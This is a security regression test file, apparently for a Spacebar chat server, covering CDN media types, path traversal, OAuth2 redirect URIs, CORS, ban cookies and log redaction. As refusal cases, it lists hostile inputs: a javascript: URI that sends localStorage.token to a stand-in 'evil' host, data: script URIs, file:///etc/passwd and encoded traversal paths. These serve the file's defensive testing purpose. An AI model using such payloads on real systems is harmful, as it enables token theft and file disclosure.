/* SPDX-License-Identifier: AGPL-3.0-only */
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const { loadModule } = require("./helpers/route-harness.cjs");

const safety = () => loadModule("src/cdn/util/responseSafety.ts", { express: {} });

test("cdn media types that browsers would run as documents are served as downloads", () => {
    const { safeMediaType } = safety();
    for (const mime of ["application/xml", "image/svg+xml", "text/html", "application/xhtml+xml", "text/xml", "application/javascript", undefined, null, ""])
        assert.equal(safeMediaType(mime), "application/octet-stream", String(mime));
    for (const mime of ["image/png", "image/gif", "image/webp", "video/mp4", "audio/ogg", "application/json", "text/plain; charset=utf-8"]) assert.equal(safeMediaType(mime), mime);
});

test("cdn requests with traversal or encoded separators are refused before routing", () => {
    const { cdnResponseSafety, hasUnsafePathSegment } = safety();
    for (const path of ["/avatars/..%2Fattachments%2F1/2", "/avatars/..", "/icons/%2e%2e/x", "/avatars/a%5Cb/c", "/avatars/a%00/b", "/avatars/%E0%A4%A"])
        assert.equal(hasUnsafePathSegment(path), true, path);
    for (const path of ["/avatars/123/abc.png", "/attachments/1/2/file.name-1.txt", "/emojis/123.webp"]) assert.equal(hasUnsafePathSegment(path), false, path);
    const headers = {};
    let status;
    let nextCalled = false;
    const res = {
        setHeader: (name, value) => {
            headers[name] = value;
        },
        status(code) {
            status = code;
            return this;
        },
        send() {
            return this;
        },
    };
    cdnResponseSafety({ originalUrl: "/avatars/..%2Fattachments%2F1/2?x=1" }, res, () => {
        nextCalled = true;
    });
    assert.equal(status, 404);
    assert.equal(nextCalled, false);
    assert.equal(headers["X-Content-Type-Options"], "nosniff");
    assert.match(headers["Content-Security-Policy"], /sandbox/);
});

test("every cdn route that reads a stored type passes it through the media type filter", () => {
    const routes = fs.readdirSync("src/cdn/routes", { recursive: true }).filter((file) => String(file).endsWith(".ts"));
    for (const file of routes) {
        const source = fs.readFileSync(`src/cdn/routes/${file}`, "utf8");
        assert.doesNotMatch(source, /res\.set\("Content-Type", type\?\.mime\)/, String(file));
        assert.doesNotMatch(source, /SANITIZED_CONTENT_TYPE\.includes\(type\.mime\)/, String(file));
    }
});

test("oauth2 redirect uris refuse script and local schemes", () => {
    const { isAllowedRedirectUri } = loadModule("src/api/util/utility/redirectUri.ts", {});
    for (const uri of [
        "javascript:fetch('//evil/'+localStorage.token)//",
        "JavaScript:alert(1)",
        " javascript:alert(1)",
        "java\tscript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox",
        "file:///etc/passwd",
        "blob:https://example.com/x",
        "not a url",
        "",
        null,
    ])
        assert.equal(isAllowedRedirectUri(uri), false, String(uri));
    for (const uri of ["https://example.com/callback", "http://localhost:3000/cb", "com.example.app:/oauth2redirect", "myapp://callback"])
        assert.equal(isAllowedRedirectUri(uri), true, uri);
});

const corsModule = (config = { api: { endpointPublic: null }, cdn: { endpointPublic: "https://cdn.example.com" }, admin: {} }) =>
    loadModule("src/api/middlewares/CORS.ts", { express: {}, "@spacebar/util": { Config: { get: () => config } } });

function corsHeaders(origin, method = "GET") {
    const { CORS } = corsModule();
    const headers = {};
    const res = {
        set: (name, value) => {
            headers[name.toLowerCase()] = value;
            return res;
        },
        vary: (name) => {
            headers.vary = name;
            return res;
        },
        status: () => res,
        end: () => res,
    };
    const requestHeaders = { Origin: origin, "Access-Control-Request-Headers": "authorization" };
    CORS({ method, header: (name) => requestHeaders[name], get: () => "chat.example.com", protocol: "https", secure: true }, res, () => undefined);
    return headers;
}

test("only the instance's own origins get credentialed cors responses", () => {
    for (const origin of ["https://chat.example.com", "https://cdn.example.com"]) {
        const headers = corsHeaders(origin, "OPTIONS");
        assert.equal(headers["access-control-allow-origin"], origin);
        assert.equal(headers["access-control-allow-credentials"], "true", origin);
    }
    for (const origin of ["https://evil.example", "http://chat.example.com", "https://chat.example.com.evil.example", "null"]) {
        const headers = corsHeaders(origin, "OPTIONS");
        assert.equal(headers["access-control-allow-origin"], origin);
        assert.equal(headers["access-control-allow-credentials"], undefined, origin);
        assert.equal(headers.vary, "Origin");
    }
    assert.equal(corsHeaders(undefined)["access-control-allow-origin"], "*");
    assert.equal(corsHeaders(undefined)["access-control-allow-credentials"], undefined);
});

test("requests from other origins don't propagate instance bans or use the ban fingerprint cookie", () => {
    const authentication = fs.readFileSync("src/api/middlewares/Authentication.ts", "utf8");
    assert.match(authentication, /fingerprint: foreignOrigin \|\| !sentFingerprint \? undefined : req\.fingerprint/);
    assert.match(authentication, /includes\(`__sb_sessid=\$\{req\.fingerprint\}`\)/, "a fingerprint made up for a request without the cookie never matches or spreads a ban");
    assert.match(authentication, /propagateBans: !foreignOrigin/);
    const token = fs.readFileSync("src/util/util/Token.ts", "utf8");
    assert.equal(token.match(/propagateBan: opts\?\.propagateBans \?\? true/g)?.length, 2);
    assert.doesNotMatch(token, /propagateBan: true/);
});

test("pages refuse to be framed by other sites and the widget stays embeddable", () => {
    const { CORS } = corsModule();
    const headers = {};
    const res = {
        set: (name, value) => {
            headers[name.toLowerCase()] = value;
        },
        vary: () => undefined,
    };
    CORS({ method: "GET", header: () => undefined, get: () => "chat.example.com", protocol: "https", secure: true }, res, () => undefined);
    assert.match(headers["content-security-policy"], /frame-ancestors 'self'/);
    assert.equal(headers["x-content-type-options"], "nosniff");
    assert.equal(headers["referrer-policy"], "strict-origin-when-cross-origin");
    assert.match(headers["strict-transport-security"], /max-age=\d+/);
    const widget = fs.readFileSync("src/api/routes_toplevel/widget.ts", "utf8");
    assert.match(widget, /res\.set\("Content-security-policy", EMBEDDABLE_CONTENT_SECURITY_POLICY\)/);
});

test("request bodies logged with a server error have their secrets and message text redacted", () => {
    const { redactBody } = loadModule("src/api/middlewares/ErrorHandler.ts", {
        express: {},
        "lambert-server/HTTPError": { HTTPError: class extends Error {} },
        "@spacebar/util": { DiscordApiErrors: {}, ApiError: class {}, FederationRequestError: class {}, FieldError: class {}, FieldErrors: () => undefined },
        "@spacebar/extensions": { StringLengthOutOfBoundsException: class {} },
    });
    const redacted = redactBody({ login: "a@example.com", password: "hunter2", undelete: false, nested: [{ new_password: "x", ticket: "t", content: "hi" }] });
    assert.equal(redacted.login, "[redacted]");
    assert.equal(redacted.password, "[redacted]");
    assert.equal(redacted.undelete, false);
    assert.equal(redacted.nested[0].new_password, "[redacted]");
    assert.equal(redacted.nested[0].ticket, "[redacted]");
    assert.equal(redacted.nested[0].content, "[redacted]");
});

test("the cdn request signature is only compared in constant time", () => {
    const offenders = fs
        .readdirSync("src", { recursive: true })
        .filter((file) => file.endsWith(".ts"))
        .filter((file) =>
            fs
                .readFileSync(`src/${file}`, "utf8")
                .split("\n")
                .some((line) => !line.trim().startsWith("//") && /(!==|===)\s*Config\.get\(\)\.security\.requestSignature/.test(line)),
        );
    assert.deepEqual(offenders, []);
});
